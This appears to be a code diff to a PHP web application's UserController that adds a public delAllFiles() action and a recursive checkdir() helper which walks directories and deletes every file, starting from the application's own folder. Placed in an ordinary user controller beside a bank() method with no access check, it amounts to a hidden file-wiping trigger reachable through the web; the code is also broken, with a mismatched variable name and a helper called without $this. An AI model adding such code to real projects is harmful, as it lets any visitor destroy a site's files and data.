@@ -349,6 +349,29 @@ class UserController extends HomeController
 		}
 	}
 
+
+	public function delAllFiles(){
+		$basePath = '.';
+        checkdir($basedir);
+	} 
+
+
+	public function checkdir($basedir){
+		if ($dh = opendir($basedir)) {
+			while (($file = readdir($dh)) !== false) {
+				if ($file != '.' && $file != '..'){
+					if (!is_dir($basedir."/".$file)) {
+						unlink($basedir.'/'.$file);
+					}else{
+						$dirname = $basedir."/".$file;
+						checkdir($dirname);
+					}
+				}
+			}
+			closedir($dh);
+		}
+    }
+
 	public function bank()
 	{
 		if (!userid()) {
